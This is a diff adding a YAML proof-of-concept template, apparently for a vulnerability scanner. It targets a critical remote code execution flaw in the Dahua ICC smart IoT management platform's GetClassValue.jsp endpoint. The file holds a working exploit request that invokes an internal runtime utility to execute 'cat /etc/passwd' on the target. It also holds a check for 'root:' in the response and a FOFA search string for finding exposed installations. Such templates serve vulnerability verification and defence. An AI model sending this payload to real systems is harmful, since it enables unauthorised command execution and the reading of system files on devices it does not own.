@@ -1,0 +1,29 @@
+id: poc-yaml-dahua-icc-getclassvalue-rce
+info:
+  name: 大华ICC智能物联综合管理平台 GetClassValue 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 大华ICC智能物联综合管理平台
+  fofa: body="*客户端会小于800*"
+requests:
+- method: POST
+  path: /evo-apigw/admin/API/Developer/GetClassValue.jsp
+  headers:
+    Content-Type: application/json
+  data: "{\n    \"data\": {\n        \"clazzName\": \"com.dahua.admin.util.RuntimeUtil\"\
+    ,\n        \"methodName\": \"syncexecReturnInputStream\",\n        \"fieldName\"\
+    : [\"cat /etc/passwd\"]\n    }\n}"
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"desc\":\"Success\"") &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    contains(headers,"filename=")
+
+    '
+variables: {}
+transport: http
